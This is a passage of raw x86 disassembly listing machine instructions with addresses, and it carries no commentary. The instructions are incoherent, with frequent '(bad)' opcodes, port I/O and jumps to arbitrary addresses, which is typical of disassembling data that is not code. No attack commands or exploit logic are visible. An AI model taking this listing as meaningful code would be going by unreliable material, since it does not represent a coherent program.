  51be7f:	jae    0x51bea1
  51be81:	pop    ds
  51be82:	out    0xe8,eax
  51be84:	cwde   
  51be85:	repz test DWORD PTR [edx+esi*1-0x6b],0x343e2db9
  51be8e:	fsubr  DWORD PTR [ecx+0x649e5e67]
  51be94:	outs   dx,DWORD PTR ds:[esi]
  51be95:	fld    DWORD PTR [esi+eax*4]
  51be98:	fld    TBYTE PTR gs:[edx]
  51be9b:	fwait
  51be9c:	push   ebx
  51be9d:	stos   BYTE PTR es:[edi],al
  51be9e:	jns    0x51be21
  51bea0:	add    DWORD PTR [eax+0x2aa73f4a],0xffffffa7
  51bea7:	adc    DWORD PTR [ebp-0x45055f35],0xfffffff4
  51beae:	mov    al,0x1b
  51beb0:	sub    eax,0x1c3cd372
  51beb5:	cld    
  51beb6:	cdq    
  51beb7:	mov    ds:0x5650e810,eax
  51bebc:	pop    ebp
  51bebd:	dec    eax
  51bebe:	daa    
  51bebf:	stc    
  51bec0:	call   DWORD PTR [esi+0x6e27f858]
  51bec6:	mov    edi,0xa7afb2fe
  51becb:	mov    edx,ecx
  51becd:	je     0x51bf19
  51becf:	int    0x43
  51bed1:	mov    ebx,0x8fa6e695
  51bed6:	xchg   DWORD PTR [ebx],eax
  51bed8:	pusha  
  51bed9:	scas   al,BYTE PTR es:[edi]
  51beda:	mov    esp,0xbc65aad1
  51bedf:	test   BYTE PTR [ebx+0xcf6a907],dl
  51bee5:	lock outs dx,DWORD PTR ds:[esi]
  51bee7:	cmp    BYTE PTR [eax+esi*1+0x65ca7984],cl
  51beee:	sub    ebx,ebx
  51bef0:	xor    DWORD PTR [bp-0x33f],ecx
  51bef5:	cmc    
  51bef6:	xchg   ebx,eax
  51bef7:	sbb    BYTE PTR [ebp+0x6b8fbec0],bl
  51befd:	cwde   
  51befe:	aam    0x80
  51bf00:	xchg   edi,eax
  51bf01:	clc    
  51bf02:	mov    dh,0x22
  51bf04:	push   esp
  51bf05:	dec    ecx
  51bf06:	fsubr  QWORD PTR [ecx+ebx*1-0x2bfcec81]
  51bf0d:	mov    ds:0x5aa87397,al
  51bf12:	add    ecx,esp
  51bf14:	and    al,0x8e
  51bf16:	cmp    eax,0x7e25067a
  51bf1b:	(bad)  
  51bf1d:	sub    ecx,DWORD PTR [esi+0xd]
  51bf20:	ret    0xf6d2
  51bf23:	mov    ds:0xc2d850e2,al
  51bf28:	sub    al,0xce
  51bf2a:	(bad)  
  51bf2b:	rcr    BYTE PTR [eax],1
  51bf2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51bf2e:	test   eax,0x86194e2
  51bf33:	(bad)  
  51bf34:	dec    ebp
  51bf35:	outs   dx,DWORD PTR gs:[esi]
  51bf37:	mov    al,ds:0x6a56e6f
  51bf3c:	fisub  DWORD PTR [edi]
  51bf3e:	addr16 xor al,0x3c
  51bf41:	dec    edi
  51bf42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51bf43:	jmp    0x1565432b
  51bf48:	xchg   edi,eax
  51bf49:	mov    WORD PTR [edx+0x65],es
  51bf4c:	mov    DWORD PTR [edx],0x78aad24e
  51bf52:	lods   eax,DWORD PTR ds:[esi]
  51bf53:	xchg   edx,eax
  51bf54:	mov    eax,0x3dbab20a
  51bf59:	adc    ch,bh
  51bf5b:	mov    eax,ds:0x97771ec2
  51bf60:	repz fbstp TBYTE PTR [ecx+0x446dfa50]
  51bf67:	xchg   BYTE PTR [ebx+0x3d],bl
  51bf6a:	fdivr  st(7),st
  51bf6c:	xor    al,0x9d
  51bf6e:	shr    BYTE PTR ds:0x6e86fee2,cl
  51bf74:	nop
  51bf75:	pushf  
  51bf76:	repz jg 0x51bf80
  51bf79:	ja     0x51bf1d
  51bf7b:	sbb    BYTE PTR [edx-0x2081a468],0xd3
  51bf82:	pushf  
  51bf83:	into   
  51bf84:	cmp    DWORD PTR [ecx],ebx
  51bf86:	pop    edi
  51bf87:	lods   al,BYTE PTR ds:[esi]
  51bf88:	cld    
  51bf89:	lds    eax,FWORD PTR [ebp-0x75]
  51bf8c:	in     eax,dx
  51bf8d:	cli    
  51bf8e:	xchg   BYTE PTR [esi+0x1a],cl
  51bf91:	hlt    
  51bf92:	mov    al,ds:0xdfa12fd7
  51bf97:	fcomp  QWORD PTR [esi-0x4b]
  51bf9a:	test   BYTE PTR [ebx+0x227e5f38],dh
  51bfa0:	mov    BYTE PTR [esi+0x39],ah
  51bfa3:	xchg   ebx,eax
  51bfa4:	jnp    0x51bf7f
  51bfa6:	addr16 jge 0x51c022
  51bfa9:	enter  0x8d24,0x61
  51bfad:	mov    DWORD PTR [ecx+0x92f0c40],ebp
  51bfb3:	and    eax,0x2b7027be
  51bfb8:	and    BYTE PTR [ecx],cl
  51bfba:	jecxz  0x51bf86
  51bfbc:	clc    
  51bfbd:	sbb    esi,eax
  51bfbf:	sub    al,0xe7
  51bfc1:	pusha  
  51bfc2:	dec    esi
  51bfc3:	(bad)  
  51bfc4:	cdq    
  51bfc5:	xlat   BYTE PTR ds:[ebx]
  51bfc6:	adc    al,0x64
  51bfc8:	out    0x8,al
  51bfca:	not    BYTE PTR [ebp-0x1c]
  51bfcd:	inc    ebp
  51bfce:	or     ah,BYTE PTR [ebp-0xf]
  51bfd1:	cld    
  51bfd2:	sub    BYTE PTR [eax-0x5630a90c],ch
  51bfd8:	xchg   esp,eax
  51bfd9:	mov    esi,0x92f70ee0
  51bfde:	stos   BYTE PTR es:[edi],al
  51bfdf:	cmp    al,0xc3
  51bfe1:	jno    0x51bfdc
  51bfe3:	pusha  
  51bfe4:	repz push 0x4d6de607
  51bfea:	daa    
  51bfeb:	and    ebp,DWORD PTR ds:0x99193dec
  51bff1:	aas    
  51bff2:	sahf   
  51bff3:	sahf   
  51bff4:	xchg   ebp,eax
  51bff5:	cs add al,0xfe
  51bff8:	xor    ecx,ebx
  51bffa:	push   edx
  51bffb:	add    al,al
  51bffd:	dec    esp
  51bffe:	rcl    DWORD PTR [edx+0x1f],0xdc
  51c002:	push   ecx
  51c003:	(bad)  
  51c004:	je     0x51bfbd
  51c006:	sbb    esp,ecx
  51c008:	(bad)  
  51c009:	(bad)  
  51c00a:	or     edi,edi
  51c00c:	push   eax
  51c00d:	push   esp
  51c00e:	sbb    al,0x48
  51c010:	jo     0x51c04d
  51c012:	dec    esi
  51c013:	mov    edi,0xb63adae0
  51c018:	mov    es,WORD PTR [edi+0x45d19b46]
  51c01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51c01f:	mov    ah,BYTE PTR [edi+edi*1-0x159cf80b]
  51c026:	cmp    DWORD PTR [ebx+0x50eba6fb],edi
  51c02c:	dec    esi
  51c02d:	sub    BYTE PTR [edx-0x2c],dh
  51c030:	inc    eax
  51c031:	xor    al,0xf0
  51c033:	mov    al,0x7e
  51c035:	xchg   ebp,eax
  51c036:	push   ebx
  51c037:	cdq    
  51c038:	loop   0x51c0a7
  51c03a:	icebp  
  51c03b:	cmp    esp,DWORD PTR [edi+0xe]
  51c03e:	cli    
  51c03f:	mov    esp,0x2ed1938e
  51c044:	nop
  51c045:	xchg   ecx,eax
  51c046:	adc    eax,0x272f9c4f
  51c04b:	out    0x68,eax
  51c04d:	fnstsw WORD PTR [ecx+eax*1+0x1b]
  51c051:	imul   edx,DWORD PTR [esi],0xffffffdb
  51c054:	cld    
  51c055:	sbb    ebp,esi
  51c057:	push   0xa54d68d2
  51c05c:	in     al,dx
  51c05d:	scas   eax,DWORD PTR es:[edi]
  51c05e:	pop    eax
  51c05f:	dec    ecx
  51c060:	xchg   ebx,eax
  51c061:	mov    cl,BYTE PTR [esi-0x64]
  51c064:	sub    al,0xd8
  51c066:	mov    ebx,0x5d4b385d
  51c06b:	mov    bh,ah
  51c06d:	rcr    BYTE PTR [eax+0x3d],cl
  51c070:	lock cmp dl,BYTE PTR [edx+0x55]
  51c074:	cmp    al,0x81
  51c076:	aas    
  51c077:	push   esi
  51c078:	push   0xbdcd9293
  51c07d:	mov    BYTE PTR [edi],cl
  51c07f:	popf   
  51c080:	(bad)  
  51c081:	mov    ebp,0xdc56a2a
  51c086:	dec    ebp
  51c087:	aas    
  51c088:	(bad)
  51c08b:	jno    0x51c038
  51c08d:	and    cl,BYTE PTR [ebx-0x49df86d4]
  51c093:	(bad)  
  51c094:	mov    al,0x9f
  51c096:	(bad)  [esi-0x38]
  51c099:	and    DWORD PTR [esi-0x57],edx
  51c09c:	dec    ebp
  51c09d:	and    al,BYTE PTR [ecx+ecx*8+0x70e9883b]
  51c0a4:	ds gs into 
  51c0a7:	add    BYTE PTR [esi+0x28f2bb53],al
  51c0ad:	outs   dx,BYTE PTR ds:[esi]
  51c0ae:	xor    ecx,DWORD PTR [edx-0x6607ec88]
  51c0b4:	aam    0x6e
  51c0b6:	pop    DWORD PTR [ecx-0x15]
  51c0b9:	mov    bl,0x2e
  51c0bb:	pushf  
  51c0bc:	inc    eax
  51c0bd:	test   al,0xde
  51c0bf:	mov    ah,0x85
  51c0c1:	into   
  51c0c2:	jg     0x51c0cc
  51c0c4:	push   edx
  51c0c5:	sub    al,0x3b
  51c0c7:	sub    DWORD PTR [ebp-0x8e036bd],ebp
  51c0cd:	or     eax,0x6c377c6f
  51c0d2:	popa   
  51c0d3:	mov    edi,0xb0a9ae18
  51c0d8:	mov    ecx,0x7c9246d3
  51c0dd:	rol    BYTE PTR [eax+0x623329ae],0xdb
  51c0e4:	stos   BYTE PTR es:[edi],al
  51c0e5:	(bad)  
  51c0e6:	mov    ebp,0x29c98431
  51c0eb:	cmp    eax,edi
  51c0ed:	sub    ebx,edx
  51c0ef:	mov    dh,0xb5
  51c0f1:	mov    ecx,0xf888d805
  51c0f6:	adc    dl,BYTE PTR [ebx+0x47]
  51c0f9:	mov    bh,0xbb
  51c0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51c0fc:	mov    esi,0xe552744a
  51c101:	mov    edx,0x12395e45
  51c106:	push   edx
  51c107:	fld    QWORD PTR [esi-0x24cc0ede]
  51c10d:	arpl   bx,ax
  51c10f:	and    edi,DWORD PTR [ebx-0x438497bf]
  51c115:	xchg   ebp,eax
  51c116:	cmp    BYTE PTR [ebp+esi*8-0x192bd159],0xfa
  51c11e:	and    DWORD PTR [ebx],ebp
  51c120:	stos   DWORD PTR es:[edi],eax
  51c121:	mov    al,ds:0xb313f879
  51c126:	ja     0x51c166
  51c128:	aam    0xb4
  51c12a:	mov    edi,esp
  51c12c:	push   0xffffffc6
  51c12e:	xor    eax,0x479c6d0a
  51c133:	sahf   
  51c134:	nop
  51c135:	leave  
  51c136:	sbb    ebp,eax
  51c138:	icebp  
  51c139:	cs cmp al,0x5e
  51c13c:	cmp    BYTE PTR [esi-0x3e22399c],ch
  51c142:	sub    DWORD PTR [esi-0x3f992530],ebp
  51c148:	fsubr  DWORD PTR [esi-0x53bbf305]
  51c14e:	adc    eax,0x634e678
  51c153:	stc    
  51c154:	jmp    0x51c193
  51c156:	(bad)
  51c159:	jl     0x51c181
  51c15b:	push   0x11
  51c15d:	sbb    cl,BYTE PTR [ebx+0x2d1ce0de]
  51c163:	or     al,0xf
  51c165:	(bad)  
  51c166:	div    WORD PTR [ebp+0x34]
  51c16a:	adc    eax,0x266ecb4c
  51c16f:	cmp    bh,al
  51c171:	ins    DWORD PTR es:[edi],dx
  51c172:	push   ebp
  51c173:	ins    BYTE PTR es:[edi],dx
  51c174:	adc    DWORD PTR [esp+edi*8],ebx
  51c177:	enter  0x5b3e,0x47
  51c17b:	xlat   BYTE PTR ds:[ebx]
  51c17c:	test   eax,0x9dd79eb8
  51c181:	cld    
  51c182:	imul   ebx,DWORD PTR [ebx-0x7db83395],0xddee2ad2
  51c18c:	dec    ebx
  51c18d:	loope  0x51c140
  51c18f:	cmp    al,0xb4
  51c191:	mov    bh,0xe8
  51c193:	loope  0x51c18e
  51c195:	pop    eax
  51c196:	and    bl,BYTE PTR [edx+0x31]
  51c199:	cmp    edx,esp
  51c19b:	adc    eax,0x22ea9d7d
  51c1a0:	clc    
  51c1a1:	jge    0x51c15a
  51c1a3:	push   esp
  51c1a4:	mov    edi,0x1210a254
  51c1a9:	sub    ecx,eax
  51c1ab:	cmp    DWORD PTR [ecx],esi
  51c1ad:	xor    BYTE PTR [ebx-0x4e0c465b],al
  51c1b3:	imul   ebx,DWORD PTR [edi],0x35
  51c1b6:	xor    al,0x66
  51c1b8:	add    dl,bl
  51c1ba:	adc    DWORD PTR [esi],esi
  51c1bc:	fild   WORD PTR [edx]
  51c1be:	gs jmp 0xc8b:0x696215bc
  51c1c6:	sbb    DWORD PTR [eax+0x3b5be642],ebx
  51c1cc:	push   edi
  51c1cd:	push   esi
  51c1ce:	dec    esp
  51c1cf:	in     al,dx
  51c1d0:	pop    es
  51c1d1:	pop    es
  51c1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c1d3:	sub    al,0xc6
  51c1d5:	retf   0xfd24
  51c1d8:	xor    ah,BYTE PTR [esi+esi*8-0x4f]
  51c1dc:	jns    0x51c1f2
  51c1de:	xor    BYTE PTR [ebp+0x5a7cd60b],dl
  51c1e4:	cmp    ebp,DWORD PTR [edi-0x48]
  51c1e7:	not    DWORD PTR [ecx+0x23]
  51c1ea:	mov    BYTE PTR [eax-0x75207ae3],bh
  51c1f0:	aas    
  51c1f1:	aam    0xa9
  51c1f3:	scas   eax,DWORD PTR es:[edi]
  51c1f4:	shr    BYTE PTR [eax],1
  51c1f6:	mov    al,ds:0x244b80d7
  51c1fb:	mov    ch,0xcd
  51c1fd:	and    DWORD PTR [edi-0x3d53e40d],eax
  51c203:	and    al,0x81
  51c205:	loopne 0x51c18d
  51c207:	push   ss
  51c208:	or     BYTE PTR [edx+0x21d82626],bh
  51c20e:	push   ebx
  51c20f:	shl    BYTE PTR [eax-0x68],0x15
  51c213:	std    
  51c214:	jmp    0xfb2dc5bf
  51c219:	loopne 0x51c239
  51c21b:	in     al,0xe1
  51c21d:	dec    edi
  51c21e:	shr    BYTE PTR [edi],0xc1
  51c221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51c222:	das    
  51c223:	loope  0x51c1af
  51c225:	xor    ecx,0x276e2d05
  51c22b:	jle    0x51c22d
  51c22d:	push   esp
  51c22e:	xchg   BYTE PTR [edx],dh
  51c230:	sbb    BYTE PTR [ecx-0x2a],0x9d
  51c234:	jl     0x51c28f
  51c236:	outs   dx,BYTE PTR ds:[esi]
  51c237:	into   
  51c238:	inc    edx
  51c239:	retf   
  51c23a:	fstp   QWORD PTR [esp+ebx*2+0x79695aeb]
  51c241:	imul   edi,DWORD PTR [ecx-0x17],0x1b793b20
  51c248:	xchg   ebp,eax
  51c249:	jp     0x51c23d
  51c24b:	jge    0x51c281
  51c24d:	test   al,0xd9
  51c24f:	adc    ch,BYTE PTR [edx-0x7f13f4aa]
  51c255:	xor    ecx,DWORD PTR [esi-0x5d862fb3]
  51c25b:	pop    edx
  51c25c:	(bad)  
  51c25d:	shr    DWORD PTR [edx+0x5a],cl
  51c260:	and    ch,al
  51c262:	mov    dh,0x69
  51c264:	xor    al,0x63
  51c266:	rcr    DWORD PTR [ebx-0x6e],1
  51c269:	cld    
  51c26a:	inc    esi
  51c26b:	ficom  WORD PTR [edx-0x29518764]
  51c271:	add    eax,DWORD PTR [edx-0x14]
  51c274:	rcr    BYTE PTR ds:0x7f10bc43,cl
  51c27a:	sbb    eax,0x8fca28f3
  51c27f:	bound  esi,QWORD PTR [edi+0x1127bd90]
  51c285:	repz mov al,bl
  51c288:	mov    ah,0x8c
  51c28a:	cmp    BYTE PTR [ecx+0x74],bl
  51c28d:	(bad)
  51c290:	and    eax,0x35bbc847
  51c295:	neg    DWORD PTR [eax+0x6c]
  51c298:	test   eax,0xad76fca0
  51c29d:	pushf  
  51c29e:	stos   DWORD PTR es:[edi],eax
  51c29f:	sahf   
  51c2a0:	add    cl,BYTE PTR [ebx+0x57]
  51c2a3:	sar    BYTE PTR [ebp-0x15678eea],1
  51c2a9:	dec    ebp
  51c2aa:	icebp  
  51c2ab:	mov    ebp,0x693a3f8d
  51c2b0:	or     al,0xab
  51c2b2:	and    bl,BYTE PTR [ebp+0x75ed66f3]
  51c2b8:	and    ch,BYTE PTR [ecx+0x6f05b753]
  51c2be:	(bad)  
  51c2bf:	stc    
  51c2c0:	inc    eax
  51c2c1:	mov    ds:0x7dd1ec0f,al
  51c2c6:	cs iret 
  51c2c8:	mov    ds:0x809988d6,al
  51c2cd:	adc    BYTE PTR [ebp+eiz*1+0x4637e294],ch
  51c2d4:	loop   0x51c332
  51c2d6:	ret    
  51c2d7:	ins    BYTE PTR es:[edi],dx
  51c2d8:	ds or  eax,0xef6181a8
  51c2de:	adc    ecx,DWORD PTR [ebp+edx*1+0x7fd9a791]
  51c2e5:	ret    0x3c69
  51c2e8:	out    0xe7,al
  51c2ea:	pusha  
  51c2eb:	arpl   WORD PTR [esi-0x68],si
  51c2ee:	fnsave [ecx-0x6cd059c5]
  51c2f4:	adc    BYTE PTR [ebp+edx*2+0x152c02d7],bl
  51c2fb:	mov    esp,0x81b4329b
  51c300:	mov    edx,0x65b70878
  51c305:	mov    cl,0x24
  51c307:	xlat   BYTE PTR ds:[ebx]
  51c308:	and    DWORD PTR [esi-0x29],ebx
  51c30b:	fsub   QWORD PTR [ebp+eiz*8-0x37]
  51c30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c310:	xchg   ecx,eax
  51c311:	div    DWORD PTR [ebx]
  51c313:	inc    esp
  51c314:	stc    
  51c315:	fwait
  51c316:	mov    WORD PTR [edx-0x4],ss
  51c319:	pushf  
  51c31a:	lods   eax,DWORD PTR ds:[esi]
  51c31b:	shr    ebx,cl
  51c31d:	into   
  51c31e:	pop    eax
  51c31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51c320:	ret    
  51c321:	js     0x51c390
  51c323:	mov    ebp,0x58b0414
  51c328:	jmp    0x5fba7b9d
  51c32d:	ja     0x51c322
  51c32f:	cld    
  51c330:	push   edx
  51c331:	pushf  
  51c332:	xor    DWORD PTR [edi],esp
  51c334:	sbb    ebp,esp
  51c336:	dec    ebx
  51c337:	cwde   
  51c338:	xchg   edx,eax
  51c339:	loop   0x51c372
  51c33b:	data16 xor al,0x84
  51c33e:	sbb    al,ah
  51c340:	fwait
  51c341:	icebp  
  51c342:	(bad)  
  51c343:	enter  0xd922,0x93
  51c347:	stos   DWORD PTR es:[edi],eax
  51c348:	or     BYTE PTR [ecx-0x1d3ae3d1],0xfa
  51c34f:	clc    
  51c350:	jbe    0x51c3a2
  51c352:	and    ebx,DWORD PTR [esi+0xbf8052a]
  51c358:	das    
  51c359:	and    DWORD PTR [eax+eax*1],ebp
  51c35c:	adc    eax,0x1b4d7dee
  51c361:	dec    ebp
  51c362:	cmp    edx,ebx
  51c364:	cmp    esp,ecx
  51c366:	add    eax,0xd5d4223a
  51c36b:	fnstsw WORD PTR [edx+0x48]
  51c36e:	addr16 aas 
  51c370:	pop    edi
  51c371:	sbb    eax,0x4e3e782b
  51c376:	dec    ecx
  51c377:	mov    bh,0x12
  51c379:	out    dx,eax
  51c37a:	cmp    eax,0xc8b7cab6
  51c37f:	xor    edi,edi
  51c381:	imul   ebx,esi,0xffffffba
  51c384:	mov    DWORD PTR [edi-0x6ecadd00],ecx
  51c38a:	neg    cl
  51c38c:	pop    ebx
  51c38d:	pushf  
  51c38e:	popf   
  51c38f:	cmc    
  51c390:	iret   
  51c391:	jne    0x51c3ab
  51c393:	jmp    DWORD PTR [edi]
  51c395:	inc    DWORD PTR [edi]
  51c397:	ffree  st(7)
  51c399:	cld    
  51c39a:	xor    ch,BYTE PTR [esi+0x78ad4f79]
  51c3a0:	repz fisubr WORD PTR [eax]
  51c3a3:	and    eax,0x82e445d0
  51c3a8:	ins    DWORD PTR es:[edi],dx
  51c3a9:	mov    al,0x88
  51c3ab:	mov    al,ds:0x5306f639
  51c3b0:	pop    ebp
  51c3b1:	fs addr16 out 0x3e,eax
  51c3b5:	fs loop 0x51c363
  51c3b8:	adc    al,0x3a
  51c3ba:	imul   esp
  51c3bc:	ret    0x1ff3
  51c3bf:	mov    BYTE PTR [eax-0x40],cl
  51c3c2:	pop    esp
  51c3c3:	ins    BYTE PTR es:[edi],dx
  51c3c4:	es test al,0xd2
  51c3c7:	les    esi,FWORD PTR [ebx]
  51c3c9:	bound  esi,QWORD PTR [edx-0x5cd49726]
  51c3cf:	or     al,0x8
  51c3d1:	lock and dh,dl
  51c3d4:	mov    WORD PTR [ebp+0x472a651c],fs
  51c3da:	out    0x9f,al
  51c3dc:	jecxz  0x51c3a5
  51c3de:	mov    ebx,0x7ebfb172
  51c3e3:	jle    0x51c3cb
  51c3e5:	ror    al,0x91
  51c3e8:	lods   al,BYTE PTR ds:[esi]
  51c3e9:	inc    eax
  51c3ea:	retf   
  51c3eb:	push   cs
  51c3ec:	stos   BYTE PTR es:[edi],al
  51c3ed:	leave  
  51c3ee:	sub    al,0x4a
  51c3f0:	cmp    al,0xb6
  51c3f2:	sbb    BYTE PTR [esi],0x66
  51c3f5:	lods   al,BYTE PTR es:[esi]
  51c3f7:	push   0x9ed1647b
  51c3fc:	or     ch,bh
  51c3fe:	jmp    0x95b1869c
  51c403:	mov    al,0x27
  51c405:	test   BYTE PTR [edx],dl
  51c407:	les    edi,FWORD PTR [edx-0x4e]
  51c40a:	sar    BYTE PTR [ebp+0x51],0xb6
  51c40e:	call   0x7f64c0ee
  51c413:	pop    ss
  51c414:	cmp    bh,cl
  51c416:	add    ebx,eax
  51c418:	stos   BYTE PTR es:[edi],al
  51c419:	aad    0xb9
  51c41b:	mov    dh,BYTE PTR [edi+0x22733328]
  51c421:	retf   
  51c422:	and    ebx,0xa526049f
  51c428:	imul   ebp,DWORD PTR [edi],0xc16a27eb
  51c42e:	lahf   
  51c42f:	mov    esi,0x5821605d
  51c434:	not    BYTE PTR [edx-0x2b]
  51c437:	or     dl,dh
  51c439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51c43a:	imul   eax,DWORD PTR [ebp+0x5],0xc
  51c43e:	cmc    
  51c43f:	sbb    eax,0xf2f1cf22
  51c444:	shl    ch,1
  51c446:	rcr    BYTE PTR [eax-0x2efd5e57],cl
  51c44c:	shufps xmm5,xmm3,0xa3
  51c450:	or     eax,0x7f9608a1
  51c455:	enter  0x6758,0xe0
  51c459:	clc    
  51c45a:	mov    al,0x33
  51c45c:	pop    ds
  51c45d:	ror    BYTE PTR [edi],1
  51c45f:	in     al,dx
  51c460:	mov    cl,0x10
  51c462:	mov    edx,ebp
  51c464:	(bad)  
  51c465:	out    dx,al
  51c466:	xchg   BYTE PTR [edx],al
  51c468:	dec    esi
  51c469:	and    esi,ecx
  51c46b:	or     ch,BYTE PTR [eax]
  51c46d:	mov    al,ds:0x199da7eb
  51c472:	push   0x738ca66
  51c477:	jnp    0x51c492
  51c479:	push   esp
  51c47a:	xchg   esp,eax
  51c47b:	mov    BYTE PTR [ebx-0x713a6ec2],dh
  51c481:	jp     0x51c4c5
  51c483:	(bad)  
  51c484:	pusha  
  51c485:	aaa    
  51c486:	rcr    bh,cl
  51c488:	shr    ebx,0xd5
  51c48b:	sahf   
  51c48c:	jbe    0x51c4a2
  51c48e:	repz leave 
  51c490:	rcl    DWORD PTR es:[ebx-0x2e],cl
  51c494:	ja     0x51c4af
  51c496:	rcl    BYTE PTR [edx+eiz*4],0xd9
  51c49a:	push   ds
  51c49b:	(bad)  
  51c49c:	lods   eax,DWORD PTR ds:[esi]
  51c49d:	pop    ebp
  51c49e:	push   eax
  51c49f:	jns    0x51c44e
  51c4a1:	xor    eax,0x4974487f
  51c4a6:	xchg   BYTE PTR [ebp+0x79],ch
  51c4a9:	lods   eax,DWORD PTR ds:[esi]
  51c4aa:	xchg   edx,eax
  51c4ab:	stos   DWORD PTR es:[edi],eax
  51c4ac:	push   edi
  51c4ad:	fldcw  WORD PTR [edx+0x72f8797a]
  51c4b3:	addr16 pusha 
  51c4b5:	scas   al,BYTE PTR es:[edi]
  51c4b6:	paddd  mm7,QWORD PTR [esi]
  51c4b9:	test   esi,esi
  51c4bb:	jnp    0x51c48f
  51c4bd:	jae    0x51c4cb
  51c4bf:	cwde   
  51c4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c4c1:	sbb    ebx,DWORD PTR [ebp+0x65e4912a]
  51c4c7:	push   0xffffff9b
  51c4c9:	jg     0x51c51d
  51c4cb:	sbb    ebp,ecx
  51c4cd:	(bad)  
  51c4ce:	ins    BYTE PTR es:[edi],dx
  51c4cf:	(bad)  
  51c4d0:	sbb    bh,BYTE PTR [edi]
  51c4d2:	mov    ch,0x49
  51c4d4:	jmp    0x51c52c
  51c4d6:	ds daa 
  51c4d8:	sbb    al,0xcd
  51c4da:	pop    edi
  51c4db:	mov    al,ds:0x2a8c6f15
  51c4e0:	inc    eax
  51c4e1:	push   esp
  51c4e2:	int3   
  51c4e3:	fisttp DWORD PTR [eax-0x22f74720]
  51c4e9:	pop    ss
  51c4ea:	pop    ebp
  51c4eb:	adc    eax,DWORD PTR [esi+0x1be3cf0]
  51c4f1:	leave  
  51c4f2:	dec    ebp
  51c4f3:	adc    eax,0xd2e7a3a
  51c4f8:	or     al,0xeb
  51c4fa:	and    esp,edx
  51c4fc:	jnp    0x51c50e
  51c4fe:	inc    ebx
  51c4ff:	sbb    BYTE PTR [ecx-0x424f1c33],ch
  51c505:	sbb    al,BYTE PTR [eax]
  51c507:	mov    dl,0xe3
  51c509:	xchg   edi,eax
  51c50a:	sub    esp,DWORD PTR [esi+0x56]
  51c50d:	push   ecx
  51c50e:	dec    esp
  51c50f:	jl     0x51c497
  51c511:	fiadd  DWORD PTR [esi]
  51c513:	int3   
  51c514:	mov    ds:0xb2c68753,al
  51c519:	rcr    DWORD PTR [ebp+0x4c7e748b],0x30
  51c520:	ds add al,0xea
  51c523:	in     al,0xbd
  51c525:	sar    BYTE PTR [edi+0x25c0484d],1
  51c52b:	jae    0x51c54c
  51c52d:	push   esp
  51c52e:	test   BYTE PTR [edx-0x19f96d4a],cl
  51c534:	mov    edi,0x559fa439
  51c539:	(bad)  
  51c53a:	fnstenv [ecx-0x6bbd7e57]
  51c540:	inc    eax
  51c541:	mov    ecx,DWORD PTR [edi+0x2cc3d650]
  51c547:	lods   eax,DWORD PTR ds:[esi]
  51c548:	cs pop ebp
  51c54a:	daa    
  51c54b:	inc    esp
  51c54c:	adc    al,0x71
  51c54e:	pop    esp
  51c54f:	iret   
  51c550:	and    BYTE PTR [esi-0x4e],al
  51c553:	sbb    DWORD PTR [eax+0x4e],esi
  51c556:	outs   dx,BYTE PTR ds:[esi]
  51c557:	scas   eax,DWORD PTR es:[edi]
  51c558:	popf   
  51c559:	xchg   BYTE PTR [eax],ah
  51c55b:	mov    esp,0x65de290d
  51c560:	dec    ebx
  51c561:	add    al,0x53
  51c563:	jmp    0x3778afbe
  51c568:	mov    cl,0xb8
  51c56a:	fistp  QWORD PTR [ebx+0x10]
  51c56d:	jp     0x51c57d
  51c56f:	std    
  51c570:	adc    ebp,DWORD PTR [edx]
  51c572:	push   ebx
  51c573:	fcomp  DWORD PTR [eax+0x11]
  51c576:	leave  
  51c577:	retf   0x2f51
  51c57a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c57b:	or     esi,DWORD PTR [ecx]
  51c57d:	xchg   esi,eax
  51c57e:	mov    bh,BYTE PTR [esi+eiz*4-0x7d]
  51c582:	pop    ecx
  51c583:	add    edi,esp
  51c585:	out    dx,eax
  51c586:	mov    ?,WORD PTR [ecx+0x52]
  51c589:	mov    eax,ds:0x4990c8cf
  51c58e:	shl    DWORD PTR [esi],1
  51c590:	test   al,0x29
  51c592:	ins    DWORD PTR es:[edi],dx
  51c593:	imul   edx,DWORD PTR ss:[ebx-0x25],0xc77c1a3b
  51c59b:	into   
  51c59c:	pop    ds
  51c59d:	mov    dh,0x60
  51c59f:	ror    DWORD PTR [esi+0x44],1
  51c5a2:	push   es
  51c5a3:	cli    
  51c5a4:	popf   
  51c5a5:	sbb    DWORD PTR [ebx-0x68],ebx
  51c5a8:	mov    ch,0xe8
  51c5aa:	or     eax,DWORD PTR [eax+0xc9b23f5]
  51c5b0:	nop
  51c5b1:	or     eax,0xe26119ac
  51c5b6:	sbb    DWORD PTR [ebx+0x202c1a44],esi
  51c5bc:	imul   esi,DWORD PTR [ecx-0x52],0xffffff83
  51c5c0:	imul   ecx,ecx,0x5718e21a
  51c5c6:	add    eax,0xb33e1e63
  51c5cb:	mov    cl,0x79
  51c5cd:	add    ah,dl
  51c5cf:	pop    eax
  51c5d0:	inc    edx
  51c5d1:	mov    ebx,0x686f5c77
  51c5d6:	fist   WORD PTR [esp+edi*8-0x15affaa2]
  51c5dd:	push   esi
  51c5de:	mov    ebp,0x347343df
  51c5e3:	xor    DWORD PTR [edi-0x63],esi
  51c5e6:	mov    eax,ds:0x7456951c
  51c5eb:	dec    ecx
  51c5ec:	or     ebx,DWORD PTR [ecx+0xb6ec429]
  51c5f2:	call   0x1df22be5
  51c5f7:	rol    ebx,cl
  51c5f9:	push   ss
  51c5fa:	sar    BYTE PTR [eax+ebx*2-0x64b0963d],0x5c
  51c602:	xchg   edx,eax
  51c603:	xlat   BYTE PTR ds:[ebx]
  51c604:	dec    ecx
  51c605:	jecxz  0x51c60b
  51c607:	and    DWORD PTR [esi],0x4f
  51c60a:	aam    0xaf
  51c60c:	je     0x230ea25b
  51c612:	scas   al,BYTE PTR es:[edi]
  51c613:	lods   eax,DWORD PTR ds:[esi]
  51c614:	xor    DWORD PTR [edi-0x23],edx
